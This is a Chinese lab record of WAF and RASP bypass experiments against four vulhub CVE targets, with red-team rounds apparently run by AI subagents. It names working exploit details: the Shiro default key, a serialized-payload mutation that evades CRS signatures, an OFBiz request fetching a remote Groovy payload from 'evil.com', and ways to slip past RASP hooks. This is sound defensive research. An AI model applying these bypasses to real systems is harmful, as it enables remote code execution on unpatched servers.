# Record — multi-round-lab 实验记录

目的：证明 4 个靶场支持「多轮有效攻击」——exp 非固定、可变异、可对单个防御工具（WAF=ModSecurity3+CRS4.29 / RASP=OpenRASP 1.3.7）做绕过。真值判据一律用容器内文件落地/回连服务命中，不采信 HTTP 状态码。

环境：`D:\Amywork\AgentSelf_Evolve\experiment\multi-round-lab`；Windows Docker Desktop（引擎=WSL2，会闲置自停，已挂 `wsl sleep 21600` 保活）；端口：裸 18080-18083，WAF 18380-18383，infra 载荷服务器 19080/容器名 `infra`/别名 `evil.com`。
模式切换（严格互斥）：裸=`--profile <t> -f compose.yaml -f compose.bare.yaml`；WAF=`--profile <t> --profile <t>-waf -f compose.yaml`；RASP=`--profile <t> -f compose.yaml -f compose.rasp.yaml -f compose.bare.yaml`。

---

## 1. 靶场与官方 seed（vulhub，已全部跑通裸基线）

| 靶场 | 镜像 | 入口 | 官方 seed | 裸基线验证（/tmp 或回连真值） |
| --- | --- | --- | --- | --- |
| JBoss CVE-2017-12149 | vulhub/jboss:as-6.1.0（Java 7u221） | POST /invoker/readonly | ysoserial CC5 raw body | ✅ r1 CC5/readonly 08:44:52；r2 CC6/readonly 08:45:24；r3 CC5/JMXInvokerServlet 08:45:25（HTTP 200 3378B 响应形态不同） |
| Shiro CVE-2016-4437 | vulhub/shiro:1.2.4（Java8 boot jar） | Cookie rememberMe | CB1 + 默认 key kPH+bIxk5D2deZiIxcaaaA==，AES-128-CBC/IV前缀/base64 | ✅ r1 CB1 08:47:35（响应无 deleteMe） |
| OFBiz CVE-2024-45507 | vulhub/ofbiz:18.12.15（Java8） | POST /webtools/control/forgotPassword/StatsSinceStart，参数 statsDecoratorLocation | SSRF 拉攻击者 Screen XML → ${groovy:} 求值 RCE | ✅ SSRF 探测（infra 日志 GET /hello.txt）+ r1 groovy v1 `'touch ...'.execute()` 08:58:28 |
| GeoServer CVE-2021-40822 | vulhub/geoserver:2.19.1（Jetty+Java17） | POST /geoserver/TestWfsPost，参数 url/body/username/password | 回显型 SSRF；约束：url host 必须等于 Host 头 | ✅ r1 GET 回显 infra 内容；r2 POST 型（回显 infra 的 501）；r3 回环自取 /geoserver/web/ 9.3KB；`file://` 被「url 必须命中本机地址」校验拒（负结果） |

关键坑位记录：
- OFBiz 18.12.15 的 `UtilHttp.canonicalizeParameterMap` 对 `isUrl` 通过的参数值调 `extractUrls(s).get(0)`，**主机名无点（如 `http://infra:8000/`）会 IndexOutOfBoundsException 500**，根本到不了 SSRF → 载荷 URL 必须带点域名 → infra 容器加了 docker alias `evil.com`。这本身是个可写进报告的「变异面」（URL 形态敏感）。
- 修复提交 ffb1bc4879 在 ScreenFactory/GroovyUtil/ScriptUtil 四处加 `UtilValidate.urlInString` 校验，证实漏洞链=装饰器 location→远程 XML 抓取→Widget 内 groovy 求值。
- ysoserial 载荷生成必须用容器 JDK8（`eclipse-temurin:8-jdk-alpine` / `8-jre`），宿主 JDK17 产 0 字节；二进制一律 python `wb` 写文件（旧项目 Record 同坑）。

## 2. WAF 轮 — JBoss（ModSecurity v3.0.17 + CRS 4.29.0 PL1，引擎 On，无自定义规则）

路径 `http://127.0.0.1:18380/invoker/readonly`，raw 序列化 body。

### 2.1 原生 exp 全被拦
- CC5/CC6/JMX 三链全部 HTTP 403，真值无痕迹；949110 入站异常分=33（阈值 5）。
- 审计 JSON messages 拆账（33 分）：944100 +944110 +944120 +944130（四条 Java 内容签名规则，5 分×4=20）+ 920340 缺 CT(+5) + 920640 缺 CT(+5)?? 实测拆分为 5+5+5+5+5+5+3：四条 944 + 920340/920640 缺CT(5+5) + 920350 数字IP Host(3)。
- 审计 JSON 完整 messages 在容器 stdout（`docker logs`，注意与 stderr 交错会截断大行，需 `2>NUL >` 分离捕获）。

### 2.2 变异 exp：UTF-8 非最短化（核心成果）
工具：`exp/jboss/naive_mutate.py`（线性扫描，适用于无 `[B` 数组的 CC 链）/ `utf8_mutate.py`（结构化解析器，CC6 已过逐字节往返校验，供 CB1 用）。
原理：流内全部 writeUTF 字符串（类名/字段名/TC_STRING）重写为 2 字节/字符非最短 modified-UTF-8（`C0|b>>6, 80|b&3F`），`ObjectInputStream.readUTFBody` 无最短形式校验，JVM 解码结果与原件相同，gadget 语义不变；WAF 的 ASCII 子串签名（944100/110/120/130 全部）失配。

踩坑三连（都是必要修正）：
1. **UTF 前缀是字节数不是字符数**——扩展后必须重写长度前缀，否则 JVM 抛 UTFDataFormatException（temurin 容器 `jrunscript` 实测发现）。
2. TC_OBJECT/TC_ARRAY/TC_CLASS/TC_ENUM 的 **newHandle 在 classDesc 之后**（规范 §6.4），先发句柄会整流编号错位（CC5 KeyError 8257563 定位）。
3. `contents_until_end` 要把「意外 eof」当异常，否则死循环空转。

变体整形（对抗 920 系协议规则）：
- 协议卫生头：`Content-Type: application/x-www-form-urlencoded`（CRS 白名单内；octet-stream 会被 920420 +5 拒）+ `Host: evil.com`（避开 920350 数字 IP +3；**python-requests 需显式覆盖 Host**，curl 要 `--noproxy "*"`，系统代理会把 Host 改写回数字 IP）。
- **元字符整形**：urlencoded CT 下 ModSec 会把 body 解析成 ARGS 触发 920250/942 雪崩（42 分）；把流内 `& % = +` 字节清零（0x26 出现在「扩展后长度=38=0x26」的字符串长度前缀低字节 → 对首字符用 3 字节形式 E0 81 A1，使扩展长度为奇数）后仅剩单个高字节参数名。

### 2.3 分数演进与绕过实证
| 变体 | 入站分 | 结果 |
| --- | --- | --- |
| 原生 CC6 | 33（四条 944 全中） | 403 |
| UTF8 变体 v1（前缀未修正） | — | JVM 拒收（UTFDataFormatException），WAF 403 |
| UTF8 变体 v2（修正前缀） | 13（944 全消，剩 920340/640/350） | 403 |
| + 协议卫生（CT/Host） | 8（920420 octet +5 或 920350 +3） | 403 |
| + 元字符整形 + urlencoded CT | 13（920250 +3、942 +5、X +5） | 403 |
| 诊断性移除 920250 → 10；再移 942/921 → 5；再移 941/930/932/933/934/939 → **HTTP 500 + `/tmp/bypass2_cc6_utf8` @ 11:34:16** | — | **RCE 穿透 WAF 真值落地** |

结论（已证命题）：
1. **内容签名层被变异完全击穿**：四条 944 Java 签名规则对 UTF-8 非最短化 payload 全部失明（33→13，-20 全部来自 944），且 payload 语义无损（RCE 真值）。原始 payload 同样卫生头下仍 25 分被拦（对照组），证明是变异本身起效。
2. 残余 13 分全部来自**与载荷内容无关的协议规范类规则**（CT 白名单 920420、缺 CT 920340/640、数字 Host 920350、ARGS-UTF8 校验 920250、urlencoded 垃圾参数上的 942/921/X 误报）。
3. 在「规则不可削弱」的严格设定下，完整 CRS+PL1 对该端点的剩余防御是协议层形状约束（CT 白名单与 body 解析器选择），不是内容检测；后续绕过方向=body-parser 假设破坏（smuggling 类），记为下一步。

## 3. WAF 轮 — Shiro（18383）

1. **CRS 默认=零防护**：原生 CB1 exp（加密 rememberMe Cookie）三轮全部穿透（r1/r2/r3 标记文件 11:44:10 / 11:45:00 / 11:45:39），CRS 看不到任何内容特征（AES 后 base64），连异常分都不涨。响应形态注意点：**CB1 链成功时响应=302+deleteMe**（gadget 在 readObject 内执行完，异常上抛后 Shiro 清 Cookie）——不能拿 deleteMe 当失败信号，真值只认 /tmp。
2. 操作员虚拟补丁 id 3001（`REQUEST_COOKIES:rememberMe @gt 500`）：**第一版静默失效**（字符串对数字 500 比较为 NaN，规则加载 851 条但不拦）——写错的签名规则不报错不生效，蓝队必须用重放验证规则；修正为 `t:length` 后 r4=403 ✓。
3. 变异面结论：RCE 载荷体积下限 ~2.7KB（CB1 + TemplatesImpl bytecode），任何可用载荷都 >500B，**长度型元签名在该传输通道上无绕过面**（Cookie 分片/改名/压缩全部破坏语义）。与 JBoss（raw body → 无法用长度签名 → 内容变异畅行）形成互补对照：**防御有效性取决于传输形态，而非规则努力程度**。

## 4. WAF 轮 — GeoServer（18382）

1. **CRS 默认=零防护**：原生 SSRF（url=infra:8000 + Host 头同步）回显成功（GEO_SSRF_ECHO_R1），无任何 CRS 规则命中。
2. 操作员虚拟补丁 id 3002（链式规则：URI 含 TestWfsPost → ARGS:url 必须 beginsWith `http://127.0.0.1:18382/geoserver`）→ 原生 SSRF 403 ✓（审计确认 3002 命中）。
3. 变体 v1：`url=http://127.0.0.1:18382/geoserver@infra:8000/waf_geo_r2.txt` + `Host: 127.0.0.1:18382`——**同时骗过操作员前缀规则与 GeoServer 自校验**（@-userinfo：Java URL 解析 host=infra:8000），但触发 CRS 949110 入站分 13（@ 形态命中 CRS 的 URL/ARGS 检测组合）→ 403。规则组归因未完全定位（该事务审计 JSON 缺 messages），后续可用移除法补测。
4. 结论：形状级虚拟补丁有效但「应用自校验+WAF 前缀」双约束可被单点 URL 解析差异同时绕过（攻击面收敛到 CRS 通用检测上）；更深变体（针对 ARGS 检测的编码整形）记为后续。

## 6. WAF 轮 — OFBiz（18381, https）

1. **CRS 默认=零防护**：原生 SSRF→Groovy RCE 直接穿透（`/tmp/waf_ofbiz_r1` @ 12:01:32），表单参数 URL 值不触发任何 CRS 规则。
2. 操作员虚拟补丁 id 3003（URI 含 `StatsSinceStart` 链 `ARGS:statsDecoratorLocation @rx (?i)^https?://`）→ 原生 exp 与 SSRF 探针全部 403，infra 日志无外连 ✓。
3. 变异矩阵（6 变体）实测：
   - 入口变体（bare / 尾斜杠 / 大小写 ForgotPassword）：全被 URI 锚定拦（403）；
   - 查询串参数（?statsDecoratorLocation=...）：ARGS 覆盖 query+body → 403；
   - 参数值百分号编码（%65vil.com）：ARGS 解码后仍命中 → 403；
   - **协议相对 `//evil.com:8000/probe`：绕过 3003 规则（HTTP 200 非 403）但 OFBiz 未真正外连**（FlexibleLocation 不远程解析该形态）→ 半绕过；
   - `ftp://evil.com:8000/probe`：规则失配且应用**真的发起了网络动作**（25s 读超时=FTP 握手挂起；python http.server 无 FTP 日志，确切握手待 FTP 服务验证）→ 若在攻击侧部署真实第二基础设施（FTP/JNDI），即构成完整绕过——**战役级后续**。
4. 结论：**表单参数类漏洞 + ARGS 级（解码后）虚拟补丁 = 单请求变异空间≈0**；攻击者必须升级基础设施（第二协议服务器、DNS rebinding）或转向协议走私。这是「多轮攻击」对防御提出的真实成本曲线。

## 7. RASP 轮（OpenRASP 1.3.7，各靶场独立 javaagent，观察→阻断→变异）

运维教训（重要）：
- **用 PowerShell `Set-Content -Encoding ASCII` 改 official.js 会把 UTF-8 中文注释打成 `?` → 插件 SyntaxError 死亡 → RASP fail-open 全放行**（12:06:32 假成功事件）。改用 `tools/patch_alllog.py`（UTF-8 安全）。
- **OpenRASP 1.3.7 在 JDK17（GeoServer/Jetty）默认 fail-open**：`java.base does not "opens jdk.internal.loader"` → 不拦不报（仅启动日志一行）。操作员修复：JAVA_OPTS 加 `--add-opens java.base/jdk.internal.loader=ALL-UNNAMED`（等 7 个 opens，见 compose.rasp.yaml）后引擎正常挂载（Engine Initialized + X-Protected-By）。**RASP 对新 JDK 的兼容性本身就是防御缺口**。
- 各靶场观察模式（all_log:true）下原生 exp 全部成功，均产生对应 attack 告警（log 态）。

| 靶场 | 阻断模式击杀层（实测） | 细节 |
| --- | --- | --- |
| OFBiz | **ssrf_userinput @ SSRF 阶段**（12:08:10 block） | 出网地址与用户输入一致即拦——比命令层更早；命令层 nio 绕过不可达。绕过方向：破坏 user-input↔connection 同一性（DNS rebinding / 第二漏洞落盘 file:// 载荷）= 战役级 |
| Shiro | **command_reflect @ 命令层 → ✅ 已绕过**（17:25:54 marker 落地，RASP 零告警；对照组原生 CB1 @ 17:26:34 command block 无 marker） | CB1 的 TemplatesImpl 通过了 deser 黑名单；命令层绕过=定制 `PwnB.class`（静态块走 `java.nio.file.Files.write`，OpenRASP 1.3.7 不 hook java.nio），生成器 `exp/shiro/{Pwn.java,GenPwn.java}`（javac 编译+反射组装 CB1，生成端无需 commons-logging）。攻击链：CB1 对象图嵌入定制字节码 → rememberMe → 穿 deser 黑名单 → 绕命令 hook → RCE 真值 |
| JBoss | **deserialization_blacklist @ 反序列化层**（12:14:13/15 block ×2） | CC5/CC1 均死于黑名单（InvokerTransformer/ChainedTransformer 在名单内——CC 系全军覆没）；CB1 在 JBoss 类路径不可达（jsf-libs 未加载，500 无 RASP 事件）。纵深守住 |
| GeoServer（JDK17+add-opens 修复后） | **ssrf_userinput @ SSRF 阶段**（12:19:38 block ×2，404=上游被断） | 与 OFBiz 同墙。观察模式回显成功（RASP_GEO_R2）对照成立 |

RASP 轮总结论：**1.3.7 的纵深在「能挂载」的靶场上全部守住**（SSRF 反射检测与命令反射检测是两堵主墙），内容层变异（WAF 轮的 UTF-8 非最短化）对 RASP 无意义（RASP 不做内容签名，只看运行时行为）。完整绕过均需战役级投入：第二协议基础设施（OFBiz/ftp）、java.nio 定制字节码（Shiro/JBoss 命令层）、DNS rebinding（SSRF 反射检测）。

## 8. 总结论

1. **「exp 不是固定的」成立**：四靶场均给出多条非等价链（JBoss 3 条、GeoServer 3 变体、Shiro key/gadget/加密参数族、OFBiz 入口/groovy 形态族），且 JBoss 内容层 UTF-8 非最短化变异实现「字节全变、语义不变」的强变异（JVM 端到端验证 + WAF 后真值 RCE）。
2. **「粗防御可被绕过」成立且分层清晰（严格口径：完整绕过成立数 0/8，见利用链汇总.md 判定表）**：
   - CRS 4.29 PL1 默认规则对 4 个洞中的 3 个（Shiro/OFBiz/GeoServer）**完全零防护**，对 JBoss 只有内容签名（被变异清零）；说明「默认 WAF」≈无 WAF。
   - 防御起效依赖正确的虚拟补丁，而补丁自身有静默失效坑（Shiro @gt 字符串比较）与形状可绕面（GeoServer 前缀规则 vs @-userinfo）。
   - OpenRASP 1.3.7 在可挂载的栈上纵深扎实（两层主墙），但对 JDK17 默认 fail-open——**旧防御栈本身是新运行时的漏洞面**。
3. **攻击成本的分层**：WAF 层绕过=载荷/请求形状级（本轮已实现）；RASP 层绕过=基础设施/字节码级（战役级，方向已明确：第二协议服务器、nio 定制字节码、DNS rebinding）。
4. 方法学沉淀：真值只认容器内落地/回连；响应码不可信（CB1 成功=302+deleteMe、RASP fail-open=200、出站评分 403）；每轮配置变更必须重放验证。

## 10. 文献对照与结论修正（2026-10-13，用户提供深度调研后）

外部深度调研（117 条检索式，覆盖官方公告/修复提交/原作者文章/产品文档/论文）对本实验的三点修正与确认：

**① 变体按「多轮攻击三分法」重标**（同一 PoC 重复=重复性；按反馈调整出新样本=自适应；防御更新后再测=再评测）：
- 请求表达变化：JBoss W1-W4（UTF-8/卫生头/元字符）、Shiro pad/mode、OFBiz %-编码与 query 串、GeoServer 编码
- 调用链变化：JBoss RASP 轮 CC5→CC6→CC1→CB1（击杀层 deser→command 迁移）
- 入口变化：JBoss readonly→JMXInvokerServlet、OFBiz 入口三变体、GeoServer file://
- 环境差异（防御未生效）：GeoServer JDK17 fail-open、official.js ASCII 损毁 fail-open

**② 「放行 ≠ 有效利用」两例证**：OFBiz ftp://（规则放行+外连发起，无语义有效性结论）；CRS 出站评分 403 与 GeoServer RASP 404（响应被替换≠攻击被阻止）。

**③ 归因修正**：
- GeoServer：vulhub README 混写 WMS GetMap 与 TestWfsPost 且引用错公告；以 GeoServer 官方 2025 公告为准（40822=TestWfsPost 缺失特定目标校验，修复 2.24.4/2.25.2，与 CVE-2024-29198 重号，后改为浏览器端实现）。
- OFBiz：校验在 18.12.16（45507）与 18.12.17（47208）持续收紧，可做修补前后对照。
- JBoss 2021《WAF绕过之旅》：其「绕过」后半段=换 Invoker 入口+认证配置问题，与本实验 C2 模式一致；不能作为「同链同入口 evasion」的公开先例。

**④ 与文献方法学对齐后承认的缺口**：实验为人工反馈驱动、无请求预算控制、无每轮反馈形式的形式化记录、无误报/业务波动基线；相关学术参照：WAF-A-MoLE(2020)、RAT(IEEE TDSC 2022)、AdvSQLi(TIFS 2024)、Java 反序列化实证研究(2022)、Runtime Prevention of Deserialization Attacks(2022)、SSRF vs. Developers(USENIX Sec 2024)、IAST vs RASP(EMSE 2025)。

**⑤ 待追线索**：ABC_123《Shiro反序列化漏洞绕WAF防护的方法总结（上篇）》（2024，原文多次读取失败）；白帽100《OpenRASP 两次绕过》(1.3.5, 2021，原文未核实)。

## 12c. OFBiz 完整绕过 ✅（姊妹向量，2026-10-13 晚）

按「应用不关心、WAF 锚定的维度=绕过面」的思路重审 3003 补丁：它双锚定 `URI⊃StatsSinceStart` + `ARGS:statsDecoratorLocation^https?://`。调研报告（子代理 A/腾讯云）给出的**姊妹入口**恰好双锚全落空：

**绕过 exp（`exp/ofbiz/ofbiz_temporal_bypass.py`，已实测）**：
```
POST /webtools/control/main/findTemporalExpression   （同一根因的另一路由，无 StatsSinceStart 字样）
tempExprDecoratorLocation=http://evil.com:8000/payloads/ofbiz_temporal_bypass.xml   （不同参数名）
远程 XML：<screen name="TemporalExpressionDecorator"> + ${groovy:'touch ...'.execute()}
```
实测链：CRS 完整规则+补丁 3003 全在位 → HTTP 200（非 403）→ infra 收到恶意 XML 拉取 → `/tmp/bypass_temporal_2` @ 15:59:57（探针）+ `/tmp/pwn_ofbiz_temporal_final` @ 16:00:49（exp 库复验）→ **RCE 真值穿透完整 WAF**。

要点：
- 入口姊妹向量至少 4 个：`forgotPassword/StatsSinceStart`、`view/StatsSinceStart`、`main/findTemporalExpression`、`forgotPassword/findTemporalExpression`（腾讯云实测未授权可达）；参数姊妹 `tempExprDecoratorLocation`（TempExprScreens.xml 同型污染）。**只封一个入口+一个参数名的虚拟补丁在姊妹向量面前=纸糊**。
- 远程 XML 的 screen name 必须为 `TemporalExpressionDecorator`（实测其余名称只触发 SSRF 不执行——装饰器按名渲染引用的 screen）。
- 顺带实证：ModSecurity v3 的 `REQUEST_URI` 匹配的是**解码后** URI → 路径百分号编码对 URI 锚定补丁无效（`%53tatsSinceStart` 仍 403，虚拟补丁此锚成立）。

## 12d. 绕过状态总表（严格口径，2026-10-13 晚终版）

| 靶场 × 工具 | 完整绕过 | 说明 |
| --- | --- | --- |
| **OFBiz × WAF（CRS+补丁3003）** | **✅ 成立** | 姊妹入口+姊妹参数名双锚落空，CRS 基线 0 分，RCE 真值 ×2 |
| **Shiro × RASP（OpenRASP 1.3.7 阻断）** | **✅ 成立** | 定制 java.nio 字节码 CB1：穿 deser 黑名单 + 绕 command hook，RCE 真值落地、RASP 零告警；对照组原生 CB1 同期被 command block（RASP 确在执法） |
| JBoss × WAF（完整 CRS） | ❌（🟡 内容层绕过成立） | 944 全家可清零（UTF-8 非最短化）；CT 策略钳形（920420+920470+920340/640）结构性守住，方法×CT 矩阵打满下限恰=阈值5；「PUT 标准答案」实测不迁移 |
| Shiro × WAF（CRS+补丁3001） | ❌ | CRS 默认零防护（原生三连穿透）；t:length 签名拦住后无绕过面（载荷体积下限） |
| GeoServer × WAF（CRS+补丁3002） | ❌（🟡） | @-userinfo 同骗补丁+应用自校验，CRS 基线 13 分兜底 |
| JBoss × RASP 1.3.7 | ❌（🟡） | deser 黑名单拦 CC 系（functors 在名单）；CB1 类路径不可达；新武器（定制 nio 字节码）已就绪，缺一条不含黑名单类的投递链（javassist/jboss-interceptors 系待试） |
| OFBiz × RASP 1.3.7 | ❌ | ssrf_userinput 在 SSRF 阶段先杀；命令层 nio 绕过不可达。路线=DNS rebinding |
| GeoServer × RASP 1.3.7 | ❌ | 同 ssrf_userinput 墙。路线=DNS rebinding |



## 12b. 「标准答案」实测：PUT 方法切换（雨了个雨 2021《WAF绕过之旅》）

原文手法：目标 WAF 规则绑定 POST body 特征 → **改成 PUT** 即绕过（readonly 是 filter，方法随意）。对本实验完整 CRS 4.29 PL1 实测（方法 × CT 完整矩阵，raw socket）：

| 方法 | CT | 入站分 | 结果 |
| --- | --- | --- | --- |
| PUT | 无 | 10（920340+920640，方法无关） | 403 |
| PUT | octet | 5（920420） | 403 |
| GET | octet | 10（920170 GET带body +5 + 920420 +5） | 403 |
| POST | 无 | 5（920340/920640 其一） | 403 |
| POST | octet | 5（920420） | 403 |

结论：**标准答案不迁移**。它击败的是「规则绑定 POST」的 WAF；CRS 4.29 的 CT 策略规则方法无关（PUT 与 POST 同价、GET 反而更贵），且任何方法 × CT 形态的分数下限=恰为阈值 5。原始文章目标的 WAF 身份/配置未公开，无法进一步比对。

## 12. JBoss 完整 CRS 绕过攻坚（2026-10-13 晚，按文献思路重打）

背景：内容层（944 全家）已被 UTF-8 非最短化变异清零；残余拦截=协议层。本轮系统性攻击 CT/协议层，全部实测：

| # | 变体 | 结果 |
| --- | --- | --- |
| T1 | `Content-Type: ;application/octet-stream`（分号开头，骗 920420 外层正则 `^[^;\s]+`） | 403，分数 13→**5**（920340/920640/920420 三个 CT 规则确实消失 8 分） |
| T2 | 分号 CT + 999-after 二分移除（修正 SecRuleRemoveById 必须在被移除规则**之后**加载的认知——BEFORE 文件里移除无效，已挂载 `jboss-999-after.conf` 诊断） | 5 分锁定在 **920000-920499**（≈920420 本体，`;`-lead 实际未躲过） |
| T3 | 920 组整体移除（诊断配置） | **入站 0 分，变异 RCE 穿透完整 WAF**（`/tmp/bypass2_cc6_utf8` @ 15:28:23；后续 403=出站评分对 500 页面，后端已执行） |
| T4 | 恢复完整 CRS 后 raw socket 三形状重测：分号前导/空格前导/Tab 前导 CT | 全部 403（5 分同源）——libmodsecurity 对头值形状的容忍度不足以躲开 920420 |
| T5 | OFBiz `%53tatsSinceStart` 路径百分号编码打 3003 | 403——**实测证明 libmodsecurity v3 的 REQUEST_URI 是解码后的**，URI 锚定补丁不受路径编码影响 |

**定论（JBoss vs 完整 CRS 4.29 PL1）**：
1. 内容检测层（944 全家 + 防守方任意 body 签名）：**可完全清零**（变异稳定，文献对照=modified-UTF-8 是公开最高水平，Synacktiv 改名重编译路线等价更重）。
2. CT 策略层：**结构性守住——CT 钳形结构已完整定名**（999-after 二分实证）：① CT 合法格式 → 920420 查白名单，不认识 +5；② CT 非法格式（`;` 开头等）→ **920470「Illegal Content-Type header」+5**；③ 无 CT → 920340/920640 +10。允许列表内 CT 全带解析器（urlencoded→junk ARGS 打分、json/xml/soap→200002 直接 400、multipart→包裹破坏流）。**Content-Type 头的每一种状态都恰好映射到 ≥5 分（阈值≥5），策略矩阵闭合，系 CRS 设计内防御（策略改 crs-setup.conf 900220），非配置事故。**
3. 出站评分 959100 会在攻击成功后 403 响应体（JBoss 500 页），但后端已执行——**响应 403 ≠ 攻击失败**（真值=/tmp）。

文献对照结论：公开世界（Synacktiv/usd HeroLab/CAPEC-80/Gregor Samsa、CVE-2021-35368、WAFFLED）没有针对「raw 二进制 body + CRS4 PL1 CT 策略层」的现成绕过；本实验的内容层清零已达公开最高水平，CT 层对该端点为 CRS 设计内的有效防御（策略矩阵闭合）。JBoss 的现实绕过路径=换入口（2021 文章模式，对 CRS 无效因为 body 层入口无关）或等待 CRS 规则/解析器演进。

## 11. 交付物索引

- 编排：`compose.yaml` / `compose.bare.yaml` / `compose.rasp.yaml`（裸/WAF/RASP 三模式互斥切换）
- exp 库：`exp/{jboss,shiro,ofbiz,geoserver}/`（含变异器 `naive_mutate.py`、结构化解析器 `utf8_mutate.py`、变异矩阵 `mut_matrix.py`）
- 工具：`tools/`（waf 审计解析、alarm 解析、all_log 补丁、字节扫描、探针体生成）
- 防御配置：`defense/waf/{jboss,shiro,geoserver,ofbiz}-rules.conf`（操作员虚拟补丁终态）；`rasp/<t>/`（OpenRASP 1.3.7）
- 载荷与产物：`exp/*/out|*.ser`、`infrastructure/www/`（恶意 Screen XML、探针文件）
- 调研报告（子代理产出，供参考）：`research/01-公开exp调研-四CVE.md`

## 13. 蓝红再对抗轮（2026-10-14，蓝队=操作员本人，红队=两个白盒子代理）

### 13.1 蓝队加固（针对 2 个已成立的完整绕过）

**OFBiz×WAF**（依据：3003 被姊妹入口绕过的根因=锚定可枚举表层特征）→ `defense/waf/ofbiz-rules.conf` 新增：
- 3005：`ARGS:/(?i)decoratorlocation$/` 值匹配 `(?i)^(?:[a-z][a-z0-9+.\-]*:|//)`（任意协议前缀或协议相对 //）→ deny。锚「参数名家族+任意 scheme」。
- 3006：URI 含 StatsSinceStart|findTemporalExpression 时任意 ARGS 值以协议前缀/`//` 开头 → deny。锚「路由+任意参数」。
- 验证：姊妹入口绕过重放 403（真值无落地，审计确认 3005 命中 `ARGS:tempExprDecoratorLocation`）；ftp://、// 变体 403；业务 GET main/login 200 不误伤。

**Shiro×RASP**（诊断性插件改动实测：deser 钩子在 Shiro 死路——`ClassResolvingObjectInputStream` 覆写 resolveClass 不走被插桩父类方法；但 **writeFile 钩子对 `java.nio.file.Files.newOutputStream` 有效**，昨日"零告警"实为算法静默放行）→ `rasp/shiro/plugins/official.js` 新增：
- `writeFile_deser`（block）：writeFile 事件调用栈任一帧含 ObjectInputStream/TemplatesImpl/ClassDefiner/defineClass → 拦。
- `writeFile_rememberme`（block）：请求携带 rememberMe cookie（触发漏洞唯一入口）时的任何 writeFile → 拦。
- deser 黑名单加后缀匹配 `/(^|\.)TemplatesImpl$/`（对 Shiro 实际不生效，为其他应用纵深）。
- 验证：nio 载荷重放被 `writeFile_deser` 拦（118B 拦截页，marker mtime 不变）；原生 CB1 对照仍被 command_reflect 拦；带/不带 cookie 的正常请求无误伤；插件热加载 Initialized。

### 13.2 红队演进（两个白盒子代理，规则全公开）

**OFBiz 红队：绕过成功**（真值 a+b 双达标）。手法：**值前导空白**（`%09`/`%20`）——WAF 侧 3005/3006 正则 `^` 锚定值开头（t:urlDecodeUni 不去空白），应用侧 `UtilHttp.canonicalizeParameterMap` 对值 split+`trim()` 剥掉 ≤U+0020 前导空白后照常 extractUrls→远程拉取→groovy RCE。`tempExprDecoratorLocation=%09http://evil.com/...` 一发即中；姊妹路由 statsDecoratorLocation 同法穿透。真值：`/tmp/pwn_rt3_temporal|stats|final` + infra 拉取日志（172.23.0.2）。exp：`exp/ofbiz/rt3_bypass_space.py`。红队建议：① 规则加 `t:trim` 或正则容忍 `^\s*`；② 对 *DecoratorLocation 改反向白名单（合法值仅 `component://`）；③ 两条管理路由未认证直接 deny（路由级收敛）。

**Shiro 红队：绕过成功**（真值 a+b 多路径）。手法一**异步逃逸**：静态块起守护线程睡 6s 脱离请求上下文后任意动作——栈无 deser 帧（A 不命中）、线程无请求上下文/cookie（B 不命中）：nio 写、`sh -c`、RAF 写、裸 Socket、HttpURLConnection 回连全部落地（`/tmp/pwn_r2_async_*` + infra `/rt/r2_*`）。手法二**非 writeFile 动作面**：请求线程栈内 `File.createNewFile`/`mkdir`/`setLastModified`（无 writeFile 事件）落地；对照组 RAF 同步写被 A 拦（证明钩子在执法）。exp：`exp/shiro/r2/PwnR2.java`。红队建议：① 插桩线程传播请求上下文/「已反序列化」标记；② 以 deser 事件为源的跨事件时间窗关联检测；③ 补 hook 面（createNewFile/mkdir/setLastModified/裸 Socket）；④ Shiro 链改在 readObject 入口或 CookieRememberMeManager 插桩；⑤ 出联基线告警。

### 13.3 本轮记分

蓝队 v1 加固两处均被白盒红队当轮绕过（OFBiz=解析差异锚点遗漏；Shiro=点状特征 vs 行为自由度）。上一轮遗留方向（DNS rebinding、第二协议）均未被使用——红队找到了更低成本的新面。防御启示：WAF 层锚「值开头」必须先做与应用侧一致的规范化（t:trim）；RASP 插件层对「任意代码执行后的任意行为」做点状拦截在异步/其他 API 面前结构性不足，关联检测需要 agent 级支持（1.3.7 插件层无解）。
